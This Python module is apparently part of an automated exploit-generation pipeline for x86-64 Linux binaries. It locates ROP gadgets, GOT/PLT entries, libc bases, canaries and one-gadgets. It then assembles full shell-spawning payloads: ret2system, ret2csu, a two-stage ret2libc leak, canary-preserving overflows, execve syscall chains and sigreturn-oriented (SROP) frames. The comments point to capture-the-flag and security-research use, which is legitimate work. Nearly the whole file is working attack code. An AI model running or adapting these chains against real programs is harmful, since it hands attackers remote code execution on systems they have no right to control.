"""ROP / ret2system chain synthesis (Phase 9 frontier, assisted).

For a no-PIE x86-64 binary without a convenient "win" function, build a return-oriented chain
that calls `system("/bin/sh")`: a `pop rdi; ret` gadget loads the argument, a "/bin/sh" string
from the image is the argument, and `system@plt` is the call target. Deterministic and pure
stdlib (an objdump assist resolves the PLT stub when available). The stage confirms the chain
by reaching `system` under a breakpoint with RDI pointing at "/bin/sh".
"""
from __future__ import annotations

import re
import shutil
import struct
import subprocess

# useful x86-64 gadget byte patterns (the VA of the match is the gadget address)
GADGETS = {
    "pop_rdi": b"\x5f\xc3",           # pop rdi ; ret
    "pop_rsi": b"\x5e\xc3",           # pop rsi ; ret
    "pop_rdx": b"\x5a\xc3",           # pop rdx ; ret
    "ret": b"\xc3",                   # ret (stack alignment)
    "pop_rsi_r15": b"\x5e\x41\x5f\xc3",  # pop rsi ; pop r15 ; ret (libc_csu)
}


def _loads(data):
    """PT_LOAD segments as (file_off, filesz, vaddr, flags)."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        return []
    endc = "<" if data[5] == 1 else ">"
    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    out = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
        p_offset = struct.unpack_from(endc + "Q", data, o + 8)[0]
        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        if p_type == 1:                                # PT_LOAD
            out.append((p_offset, p_filesz, p_vaddr, p_flags))
    return out


def _va_of(segs, file_off, need_x=False):
    for off, sz, va, flags in segs:
        if off <= file_off < off + sz and (not need_x or (flags & 1)):
            return va + (file_off - off)
    return None


def _find_exec(data: bytes, pat: bytes):
    segs = _loads(data)
    for off, sz, _va, flags in segs:
        if not (flags & 1):                            # executable segments only
            continue
        idx = data.find(pat, off, off + sz)
        if idx >= 0:
            return _va_of(segs, idx, need_x=True)
    return None


def find_gadget(data: bytes, name: str):
    """VA of the first occurrence of gadget `name` in an executable segment, or None."""
    pat = GADGETS.get(name)
    return _find_exec(data, pat) if pat else None


# __libc_csu_init gadgets (present in ELF binaries built against pre-glibc-2.34 startup and in
# many firmware/legacy targets). The pop gadget loads rbx/rbp/r12/r13/r14/r15; the call gadget
# does rdx=r15; rsi=r14; edi=r13d; call [r12+rbx*8] -- a full 3-argument controlled call.
CSU_POP = bytes([0x5b, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3])
CSU_CALL = bytes([0x4c, 0x89, 0xfa, 0x4c, 0x89, 0xf6, 0x44, 0x89, 0xef, 0x41, 0xff, 0x14, 0xdc])


def find_csu(data: bytes):
    """{'pop': va, 'call': va} for the __libc_csu_init ret2csu gadgets, or None."""
    pop = _find_exec(data, CSU_POP)
    call = _find_exec(data, CSU_CALL)
    return {"pop": pop, "call": call} if pop and call else None


def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0):
    """ret2csu chain: pop-gadget loads rbx/rbp/r12=ptr/r13=edi/r14=rsi/r15=rdx, then the
    call-gadget does the 3-arg call *[ptr+rbx*8]."""
    body = bytearray(_cyclic(offset))
    for w in (pop, rbx, rbp, ptr, edi, rsi, rdx, call):
        body += struct.pack("<Q", w & 0xFFFFFFFFFFFFFFFF)
    body += b"C" * 64                                  # post-call padding (breakpoint fires first)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def find_one_gadgets(data: bytes):
    """One-gadget candidates in a libc image: addresses that reach `execve("/bin/sh", ...)` in a
    single jump. Found without the external `one_gadget` tool (air-gap) by the byte pattern
    `lea rdi,[rip -> "/bin/sh"]` (48 8d 3d <disp32>) followed within a short window by a call to
    execve or an execve syscall (rax=0x3b; 0f 05). Jumping to the lea sets rdi="/bin/sh"; the site
    fires execve iff rsi and rdx are NULL at that moment -- so the constraint is recorded (whether
    the window zeroes them inline, in which case there is no precondition). Returns
    [{offset, constraint, execve}] sorted by offset (offset = VA of the lea = the one-gadget)."""
    segs = _loads(data)
    if not segs:
        return []
    binsh = find_string(data, b"/bin/sh")
    if binsh is None:
        return []
    syms = libc_symbols(data, ["execve"])
    execve_va = syms.get("execve")
    out, seen = [], set()
    for off, sz, va, fl in segs:
        if not (fl & 1):
            continue
        seg = data[off:off + sz]
        i = 0
        while True:
            j = seg.find(b"\x48\x8d\x3d", i)             # lea rdi, [rip + disp32]
            if j < 0 or j + 7 > len(seg):
                break
            i = j + 1
            disp = int.from_bytes(seg[j + 3:j + 7], "little", signed=True)
            site = va + j
            if site + 7 + disp != binsh:                 # rdi must resolve to "/bin/sh"
                continue
            win = seg[j + 7:j + 7 + 80]                  # look ahead for the execve call/syscall
            fires = False
            for k in range(0, len(win) - 4):
                if execve_va is not None and win[k] == 0xE8:   # call rel32 -> execve
                    tgt = (va + j + 7 + k) + 5 + int.from_bytes(win[k + 1:k + 5], "little", signed=True)
                    if tgt == execve_va:
                        fires = True
                        break
                if win[k] == 0xB8 and win[k + 1:k + 5] == b"\x3b\x00\x00\x00":   # mov eax,0x3b
                    fires = True
                    break
                if win[k:k + 7] == b"\x48\xc7\xc0\x3b\x00\x00\x00":              # mov rax,0x3b
                    fires = True
                    break
            if not fires:
                continue
            zsi = any(p in win for p in (b"\x31\xf6", b"\x45\x31\xf6", b"\x48\x31\xf6"))  # xor esi,esi
            zdx = any(p in win for p in (b"\x31\xd2", b"\x45\x31\xd2", b"\x48\x31\xd2"))  # xor edx,edx
            constraint = "none (rsi/rdx zeroed inline)" if (zsi and zdx) else \
                ("rdx==NULL" if zsi else ("rsi==NULL" if zdx else "rsi==NULL && rdx==NULL"))
            if site not in seen:
                seen.add(site)
                out.append({"offset": site, "constraint": constraint, "execve": execve_va})
    return sorted(out, key=lambda g: g["offset"])


def find_string(data: bytes, s: bytes):
    """VA of byte string `s` (NUL-terminated form preferred) in a loaded segment, or None."""
    segs = _loads(data)
    for probe in (s + b"\x00", s):
        for off, sz, _va, _fl in segs:
            idx = data.find(probe, off, off + sz)
            if idx >= 0:
                return _va_of(segs, idx)
    return None


def resolve_plt(exe_path, name: str):
    """Address of `<name@plt>` via objdump, or None (objdump absent / symbol not called)."""
    if not shutil.which("objdump"):
        return None
    try:
        out = subprocess.run(["objdump", "-d", "--no-show-raw-insn", str(exe_path)],
                             capture_output=True, timeout=60, check=False).stdout.decode(
                                 "latin-1", "ignore")
    except (OSError, subprocess.SubprocessError):
        return None
    m = re.search(r"^0*([0-9a-fA-F]+)\s+<" + re.escape(name) + r"(?:@plt)?>:", out, re.M)
    return int(m.group(1), 16) if m else None


def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length: int,
                     ret_gadget=None) -> bytes:
    """cyclic filler, then: [ret align] ; pop rdi ; &"/bin/sh" ; system."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)                       # 16-byte stack alignment for movaps
    chain += [pop_rdi, binsh, system]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


# --- ret2libc WITH a runtime leak (defeats ASLR without a `system` PLT entry) -------------------
# A modern challenge imports only puts/printf/read from libc -- never `system` -- and runs under
# ASLR, so neither a `system` PLT slot nor a fixed libc address exists. The classic answer is two
# stages over one connection: leak a libc pointer (call puts@plt on a GOT entry), subtract the
# symbol's known offset in THIS libc to recover the base, then re-trigger the overflow with a
# system("/bin/sh") chain built from base+offset. These helpers are the reusable primitives.

def _elf_class_endian(data: bytes):
    return (data[4] == 2, "<" if data[5] == 1 else ">")   # (is64, struct endian char)


def _sections(data: bytes) -> dict:
    """{section name: (offset, size, entsize)} from the section header table; {} on malformation."""
    try:
        is64, endc = _elf_class_endian(data)
        if is64:
            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x3A)
            fmt, off_i, sz_i, ent_i = endc + "IIQQQQIIQQ", 4, 5, 9
        else:
            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
            e_shentsize, e_shnum, e_shstrndx = struct.unpack_from(endc + "HHH", data, 0x2E)
            fmt, off_i, sz_i, ent_i = endc + "IIIIIIIIII", 4, 5, 9
        shs = [struct.unpack_from(fmt, data, e_shoff + i * e_shentsize) for i in range(e_shnum)]
        strtab_off = shs[e_shstrndx][off_i]

        def _name(o):
            end = data.find(b"\x00", strtab_off + o)
            return data[strtab_off + o:end].decode("latin-1", "replace")

        return {_name(sh[0]): (sh[off_i], sh[sz_i], sh[ent_i]) for sh in shs}
    except Exception:
        return {}


def libc_symbols(data: bytes, names) -> dict:
    """{name: st_value} for the requested EXPORTED symbols of a libc/.so, read straight from
    .dynsym. `st_value` is the unrelocated vaddr, so the runtime address is `libc_base + st_value`.
    Pure stdlib (no readelf/nm), best-effort: {} on any malformation."""
    secs = _sections(data)
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not ds or not st:
        return {}
    is64, endc = _elf_class_endian(data)
    entsize = ds[2] or (24 if is64 else 16)
    stroff = st[0]
    want, out = set(names), {}
    for o in range(ds[0], ds[0] + ds[1], entsize):
        try:
            if is64:
                st_name, _info, _oth, st_shndx, st_value, _sz = struct.unpack_from(
                    endc + "IBBHQQ", data, o)
            else:
                st_name, st_value, _sz, _info, _oth, st_shndx = struct.unpack_from(
                    endc + "IIIBBH", data, o)
        except struct.error:
            break
        if st_shndx == 0 or not st_value:            # undefined import, or no address -> skip
            continue
        end = data.find(b"\x00", stroff + st_name)
        nm = data[stroff + st_name:end].decode("latin-1", "replace")
        if nm in want and nm not in out:
            out[nm] = st_value
            if len(out) == len(want):
                break
    return out


def _libc_symbol_values(data: bytes) -> set:
    """Every DEFINED function/object symbol VALUE (unrelocated vaddr) in .dynsym -- the anchors a
    leaked libc pointer's page offset can be matched against, to recover the libc base."""
    secs = _sections(data)
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not ds:
        return set()
    is64, endc = _elf_class_endian(data)
    entsize = ds[2] or (24 if is64 else 16)
    vals = set()
    for o in range(ds[0], ds[0] + ds[1], entsize):
        try:
            if is64:
                _n, info, _oth, shndx, value, _sz = struct.unpack_from(endc + "IBBHQQ", data, o)
            else:
                _n, value, _sz, info, _oth, shndx = struct.unpack_from(endc + "IIIBBH", data, o)
        except struct.error:
            break
        if shndx != 0 and value and (info & 0xF) in (1, 2):   # STT_OBJECT / STT_FUNC, defined
            vals.add(value)
    return vals


# Distinctive libc symbols a real leak commonly discloses (FILE structs, environ, key functions);
# a curated anchor set so a stack/PIE value can't coincidentally corroborate a bogus base.
_LEAK_ANCHOR_SYMS = (
    "_IO_2_1_stdout_", "_IO_2_1_stderr_", "_IO_2_1_stdin_", "stdout", "stderr", "stdin",
    "environ", "__environ", "_environ", "_IO_file_jumps", "_IO_wfile_jumps",
    "__libc_start_main", "__free_hook", "__malloc_hook", "system", "puts", "printf",
    "read", "write", "malloc", "free", "setvbuf", "__stack_chk_fail", "exit")


def recover_libc_base(leaked, libc_data: bytes):
    """Recover a libc's load base from leaked runtime pointers, the same page-offset method as
    exploit.recover_pie_base but anchored on the LIBC's own exported symbols. A leaked pointer to a
    libc symbol (a FILE like _IO_2_1_stdout_, a function address in the GOT) has `& 0xfff` equal to
    that symbol's page offset; base = leaked - symbol. libc has thousands of symbols so a lone match
    is cheap coincidence, so a base is accepted only when >=2 DISTINCT leaked slots corroborate it.
    Returns the page-aligned base or None. NOTE: a bare return-address-into-libc (e.g. the
    __libc_start_call_main return commonly on the stack) is NOT a symbol start and will not match --
    that case needs a version-specific offset the caller must supply.

    Anchored on a CURATED set of distinctive, commonly-leaked symbols (the _IO_ FILE structs,
    environ, a few well-known functions) rather than all of libc's thousands: with thousands of
    anchors a stack/PIE value coincidentally matches some symbol's page offset ~every time, so two
    of them corroborate a bogus base (a leaked stack address masqueraded as libc). The curated set
    keeps the real leaks (stdout/stderr/environ/puts...) while making a false 2-way match unlikely."""
    anchors: dict = {}
    for va in libc_symbols(libc_data, _LEAK_ANCHOR_SYMS).values():
        anchors.setdefault(va & 0xFFF, []).append(va)
    if not anchors:
        return None
    support: dict = {}
    for v in leaked:
        v = int(v)
        if not (0x1000 <= v <= 0x7FFFFFFFFFFF):
            continue
        for va in anchors.get(v & 0xFFF, ()):
            base = v - va
            if base > 0 and (base & 0xFFF) == 0:
                support.setdefault(base, set()).add(v)
    best = max(support, key=lambda b: len(support[b]), default=None)
    if best is None or len(support[best]) < 2:
        return None
    return best


def got_entry(data: bytes, name: str):
    """The GOT slot the PLT stub for `name` dereferences, read from .rela.plt/.rel.plt. For a
    no-PIE binary this is the absolute address whose contents (the resolved libc function) a
    `puts(got)` leak prints -- so leaking it and subtracting the symbol's libc offset gives the
    libc base. Pure stdlib, best-effort: None if the reloc/symbol tables are absent."""
    secs = _sections(data)
    rela = secs.get(".rela.plt") or secs.get(".rel.plt")
    ds, st = secs.get(".dynsym"), secs.get(".dynstr")
    if not rela or not ds or not st:
        return None
    is64, endc = _elf_class_endian(data)
    rel_ent = rela[2] or (24 if is64 else 8)
    sym_ent = ds[2] or (24 if is64 else 16)
    stroff = st[0]

    def _symname(idx):
        try:
            st_name = struct.unpack_from(endc + "I", data, ds[0] + idx * sym_ent)[0]
            end = data.find(b"\x00", stroff + st_name)
            return data[stroff + st_name:end].decode("latin-1", "replace")
        except struct.error:
            return ""

    for o in range(rela[0], rela[0] + rela[1], rel_ent):
        try:
            if is64:
                r_offset, r_info = struct.unpack_from(endc + "QQ", data, o)[:2]
                sym = r_info >> 32
            else:
                r_offset, r_info = struct.unpack_from(endc + "II", data, o)[:2]
                sym = r_info >> 8
        except struct.error:
            break
        if _symname(sym) == name:
            return r_offset
    return None


def _jcc_at(seg, p):
    """True if seg[p:] begins an equality conditional jump: short jz/jnz (74/75) or the near
    two-byte forms (0f 84 / 0f 85). Compilers pick either depending on the branch distance."""
    if p < len(seg) and seg[p] in (0x74, 0x75):
        return True
    return p + 1 < len(seg) and seg[p] == 0x0F and seg[p + 1] in (0x84, 0x85)


def _s8(b):
    return b - 256 if b >= 128 else b


def find_magic_gates(data: bytes):
    """Find a stack LOCAL checked against a magic constant that gates a branch (jeeves'
    `if (local==0x1337bab3)` -> read+print the flag). A stack overflow that writes IMM32 into the
    local satisfies the check without touching the return address. Two code shapes are recognised,
    each followed by an equality jump (short or near):

      * direct compare  -- `cmp dword [rbp-X], IMM32`  (81 7d <disp8> <imm32>) / `[rsp+X]`
      * load-then-compare -- `mov eax, [rbp-X]; cmp eax, IMM32`  (8b 45 <disp8> ... 3d <imm32>)

    the second is what gcc/clang emit for a `volatile` local or at higher optimisation. Returns
    [{va, magic, disp}] where `disp` is the local's signed rbp displacement (negative == a local
    below rbp, the overflowable case)."""
    out = []
    seen = set()
    for off, sz, va, fl in _loads(data):
        if not (fl & 1):                                 # executable segments only
            continue
        seg = data[off:off + sz]
        # (a) direct memory compare against an immediate.
        i = 0
        while True:
            j = seg.find(b"\x81\x7d", i)                 # cmp dword [rbp+disp8], imm32
            k = seg.find(b"\x81\x7c\x24", i)             # cmp dword [rsp+disp8], imm32
            hit = min(x for x in (j, k) if x >= 0) if (j >= 0 or k >= 0) else -1
            if hit < 0:
                break
            i = hit + 1
            rbp = seg[hit:hit + 2] == b"\x81\x7d"
            base = hit + (3 if rbp else 4)
            if base + 4 > len(seg):
                continue
            disp = _s8(seg[base - 1])
            magic = int.from_bytes(seg[base:base + 4], "little")
            if magic > 0x1000 and disp < 0 and _jcc_at(seg, base + 4):
                key = (va + hit, magic)
                if key not in seen:
                    seen.add(key)
                    out.append({"va": va + hit, "magic": magic, "disp": disp})
        # (b) load a local into eax, then compare eax to an immediate: mov eax,[rbp+disp8] (8b 45
        #     <disp8>) followed within a few bytes by cmp eax,imm32 (3d <imm32>) then a jcc.
        i = 0
        while True:
            m = seg.find(b"\x8b\x45", i)                 # mov eax, dword [rbp+disp8]
            if m < 0 or m + 3 > len(seg):
                break
            i = m + 1
            disp = _s8(seg[m + 2])
            if disp >= 0:
                continue
            c = seg.find(b"\x3d", m + 3, m + 12)         # cmp eax, imm32, near the load
            if c < 0 or c + 5 > len(seg):
                continue
            magic = int.from_bytes(seg[c + 1:c + 5], "little")
            if magic > 0x1000 and _jcc_at(seg, c + 5):
                key = (va + m, magic)
                if key not in seen:
                    seen.add(key)
                    out.append({"va": va + m, "magic": magic, "disp": disp})
    return out


def find_canary(vals):
    """A leaked stack canary from a set of leaked values (a %p dump / an over-read). glibc's canary
    is a full-width random word with its LOW BYTE forced to 0x00 (so a string read stops before it
    leaks accidentally), so it reads as: low byte 0x00, the rest non-zero and high-entropy, and it
    is NOT a canonical pointer (not the 0x5.../0x7f... ranges of PIE code / stack / libc). Returns
    the first value matching that shape, or None. A caller that knows the exact leak slot should
    pass that value directly rather than rely on this heuristic."""
    for v in vals:
        v = int(v)
        if v & 0xFF:                                     # low byte must be the 0x00 terminator
            continue
        if v >> 8 == 0:                                  # not zero
            continue
        if v < 0x1000000000000:                          # a canary fills the top bytes; small -> no
            continue
        if 0x550000000000 <= v <= 0x5FFFFFFFFFFF:        # looks like a PIE code pointer
            continue
        if 0x7F0000000000 <= v <= 0x7FFFFFFFFFFF:        # looks like a stack / libc / mmap pointer
            continue
        return v
    return None


def build_canary_prefix(canary_offset: int, canary: int, ret_offset: int) -> bytes:
    """The overflow filler that reaches the saved return address WITHOUT tripping the stack
    protector: pad to the canary slot, write the leaked canary back unchanged, then pad across the
    saved frame pointer to the return slot. The caller appends the ROP chain / target address."""
    body = bytearray(b"A" * canary_offset)
    body += struct.pack("<Q", canary & 0xFFFFFFFFFFFFFFFF)
    gap = ret_offset - canary_offset - 8
    body += b"B" * max(0, gap)
    return bytes(body)


def resolve_libc_base(leaked: int, sym_offset: int):
    """libc load base from a leaked runtime address of a symbol at `sym_offset`. A real libc base
    is page-aligned; anything else means the leak was not the pointer we assumed, so return None
    rather than a bogus base that would send every resolved address into the weeds."""
    base = leaked - sym_offset
    return base if base > 0 and base % 0x1000 == 0 else None


def build_leak_puts(offset: int, *, pop_rdi: int, got: int, puts_plt: int, ret_to: int,
                    length: int = 0, ret_gadget=None) -> bytes:
    """Stage 1: cyclic filler, then puts(GOT) -- prints the libc address stored at `got` as raw
    little-endian bytes -- and returns to `ret_to` (the vulnerable function / main) so the program
    loops back and reads stage 2 over the same connection."""
    body = bytearray(_cyclic(offset))
    chain = [pop_rdi, got, puts_plt]
    if ret_gadget:
        chain.append(ret_gadget)                         # keep rsp 16-aligned for the re-entry
    chain.append(ret_to)
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def _cyclic(n):
    from .primitive import cyclic
    return cyclic(n)


# --------------------------------------------------------------------------- SROP (x86-64)
# Sigreturn-oriented programming: a single `syscall` with rax=15 (rt_sigreturn) restores the ENTIRE
# register set from a frame the attacker placed on the stack. It turns a stack overflow + one
# syscall gadget into arbitrary register control -- enough to call execve("/bin/sh",0,0) without any
# pop-gadgets. Used for static/no-PIE targets where a ret2libc/ret2csu chain isn't available.

_SC = b"\x0f\x05"                                   # syscall
_SC_RET = b"\x0f\x05\xc3"                           # syscall ; ret
_POP_RAX = b"\x58\xc3"                              # pop rax ; ret

# byte offset (in 8-byte words) of each register inside the amd64 rt_sigframe the kernel reads at
# rsp when rt_sigreturn runs. Matches the Linux sigcontext layout (== pwntools SigreturnFrame).
_SIGFRAME_WORDS = {
    "r8": 5, "r9": 6, "r10": 7, "r11": 8, "r12": 9, "r13": 10, "r14": 11, "r15": 12,
    "rdi": 13, "rsi": 14, "rbp": 15, "rbx": 16, "rdx": 17, "rax": 18, "rcx": 19,
    "rsp": 20, "rip": 21,
}
_CSGSFS_WORD = 23                                   # cs=0x33 for 64-bit user code


def find_syscall(data: bytes):
    """VA of a `syscall ; ret` gadget (preferred) or a bare `syscall`, or None."""
    return _find_exec(data, _SC_RET) or _find_exec(data, _SC)


def find_pop_rax(data: bytes):
    """VA of a `pop rax ; ret` gadget, or None (rax must then be set another way)."""
    return _find_exec(data, _POP_RAX)


_MOV_EAX_15 = b"\xb8\x0f\x00\x00\x00\xc3"           # mov eax, 15 ; ret
_MOV_RAX_15 = b"\x48\xc7\xc0\x0f\x00\x00\x00\xc3"   # mov rax, 15 ; ret


def find_rax15(data: bytes):
    """A gadget that puts 15 (rt_sigreturn) into rax for SROP, as (vaddr, kind): `pop rax;ret`
    (kind 'pop' -- the 15 is the NEXT stack word) or `mov eax/rax,15;ret` (kind 'mov' -- no stack
    word). Generalises the SROP bootstrap beyond `pop rax`, which some no-pop-rax binaries lack."""
    a = find_pop_rax(data)
    if a:
        return (a, "pop")
    a = _find_exec(data, _MOV_EAX_15) or _find_exec(data, _MOV_RAX_15)
    if a:
        return (a, "mov")
    return None


def find_writable(data: bytes, need: int = 16):
    """(vaddr, size) of a SAFE fixed writable address to plant bytes on a no-PIE target: an address
    in the .bss (the uninitialized tail of a writable PT_LOAD, past p_filesz) rather than the
    segment START -- the start holds .dynamic/.got/.data, and a read() that overruns them corrupts
    the loader state and crashes before execve. Falls back to the segment start only if no .bss."""
    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
        return None
    endc = "<" if data[5] == 1 else ">"
    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
    fallback = None
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if o + e_phentsize > len(data):
            break
        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
        if p_type != 1 or not (p_flags & 2):            # PT_LOAD, writable (p_flags bit1 = W)
            continue
        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
        p_memsz = struct.unpack_from(endc + "Q", data, o + 40)[0]
        bss = (p_vaddr + p_filesz + 0xF) & ~0xF         # start of .bss, 16-aligned
        room = (p_vaddr + p_memsz) - bss
        if room >= max(need, 16):
            return (bss, room)                          # uninitialized -> safe to clobber
        if fallback is None and p_memsz >= need:
            fallback = (p_vaddr, p_memsz)
    return fallback


def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx=0,
                    r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0) -> bytes:
    """The 248-byte amd64 rt_sigframe restored by rt_sigreturn(rax=15). Set the registers the
    controlled `syscall` at `rip` will then use (e.g. rax=59, rdi=&"/bin/sh" for execve)."""
    words = [0] * 31                                # 31 qwords = 0xF8 bytes
    vals = dict(rip=rip, rsp=rsp, rdi=rdi, rsi=rsi, rdx=rdx, rax=rax, rbp=rbp, rbx=rbx, rcx=rcx,
                r8=r8, r9=r9, r10=r10, r11=r11, r12=r12, r13=r13, r14=r14, r15=r15)
    for reg, w in _SIGFRAME_WORDS.items():
        words[w] = vals[reg]
    words[_CSGSFS_WORD] = 0x33
    return b"".join(struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF) for v in words)


def execve_feasible(data: bytes):
    """What a direct execve("/bin/sh",0,0) syscall ROP needs, and what this binary supplies. Unlike
    SROP it sets the argument registers with plain pop gadgets, so it wants pop rdi/rsi/rdx, a way
    to put 59 in rax (pop rax), a `syscall` gadget and a "/bin/sh" string. The natural chain for a
    binary that imports no `system` but has these gadgets + the string (common in static/CTF
    binaries)."""
    return {
        "syscall": find_syscall(data),
        "pop_rdi": find_gadget(data, "pop_rdi"),
        "pop_rsi": find_gadget(data, "pop_rsi"),
        "pop_rdx": find_gadget(data, "pop_rdx"),
        "pop_rax": find_pop_rax(data),
        "binsh": find_string(data, b"/bin/sh"),
    }


def build_execve_syscall(offset: int, *, binsh: int, syscall: int, pop_rdi: int, pop_rsi: int,
                         pop_rdx: int, pop_rax: int, length: int = 0, ret_gadget=None) -> bytes:
    """cyclic filler, then rdi=&"/bin/sh" ; rsi=0 ; rdx=0 ; rax=59 ; syscall -> execve("/bin/sh",0,0).
    A no-PIE binary uses fixed addresses; a PIE caller relocates each argument by the leaked base."""
    body = bytearray(_cyclic(offset))
    chain = []
    if ret_gadget:
        chain.append(ret_gadget)
    chain += [pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall]
    for word in chain:
        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def srop_feasible(data: bytes):
    """What an SROP execve chain needs, and which pieces this binary supplies. Returns a dict the
    exploit stage uses to decide: {syscall, pop_rax, writable, binsh}. `syscall` is required; a
    writable segment (to plant "/bin/sh") and a way to set rax=15 are the other gatekeepers."""
    return {
        "syscall": find_syscall(data),
        "pop_rax": find_pop_rax(data),
        "rax15": find_rax15(data),                      # (addr, 'pop'|'mov') -- generalises pop_rax
        "writable": find_writable(data),
        "binsh": find_string(data, b"/bin/sh"),
    }


def build_srop_execve(offset: int, *, syscall: int, binsh: int, length: int,
                      pop_rax: int, rsp: int = 0) -> bytes:
    """One-shot SROP execve("/bin/sh",0,0) for a binary WITH a `pop rax; ret` gadget and "/bin/sh"
    already at `binsh`: overflow -> pop rax;15 -> syscall(rt_sigreturn) -> frame(execve).
    The `syscall` gadget doubles as the frame's rip so the restored rax=59 runs execve."""
    body = bytearray(_cyclic(offset))
    body += struct.pack("<Q", pop_rax)
    body += struct.pack("<Q", 15)                   # rt_sigreturn
    body += struct.pack("<Q", syscall)              # executes rt_sigreturn
    body += sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0, rsp=rsp or binsh)
    if len(body) < length:
        body += b"C" * (length - len(body))
    return bytes(body)


def build_srop_execve_plant(offset: int, *, syscall: int, rax15, writable: int,
                            count: int = 0x200, binsh_off: int = 0x120):
    """Two-STAGE SROP execve for a binary that has a writable segment and a rax=15 gadget but NO
    "/bin/sh" string in the image: PLANT the string via a read, then execve it. No leak needed on a
    no-PIE target because `writable` is a fixed address. `rax15` is (vaddr, kind) from find_rax15:
    a `pop rax;ret` (the 15 follows on the stack) or a `mov eax/rax,15;ret` (no stack word).

      stage1 (to the overflowing read): pad(offset) -> set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=0(read), rdi=0, rsi=writable, rdx=count, rip=syscall, rsp=writable}
        -- so after the read the `ret` pivots rsp INTO the freshly-read stage2.
      stage2 (to that read): set rax=15 -> syscall(rt_sigreturn) ->
        frame{rax=59(execve), rdi=writable+binsh_off, rip=syscall} ... "/bin/sh\\0" at +binsh_off.

    Returns (stage1, stage2): send stage1 to the overflow, then stage2 to the planted read.
    """
    gaddr, kind = rax15

    def _set_rax15():                                # put 15 in rax, then the syscall gadget
        if kind == "pop":                            # pop rax; ret -- 15 is the next stack word
            return struct.pack("<Q", gaddr) + struct.pack("<Q", 15) + struct.pack("<Q", syscall)
        return struct.pack("<Q", gaddr) + struct.pack("<Q", syscall)   # mov eax,15;ret -- no word
    binsh = writable + binsh_off
    stage2 = _set_rax15() + sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0,
                                            rsp=writable)
    stage2 = stage2.ljust(binsh_off, b"\x00") + b"/bin/sh\x00"
    frame1 = sigreturn_frame(rip=syscall, rax=0, rdi=0, rsi=writable, rdx=count, rsp=writable)
    stage1 = bytes(_cyclic(offset)) + _set_rax15() + frame1
    return stage1, stage2
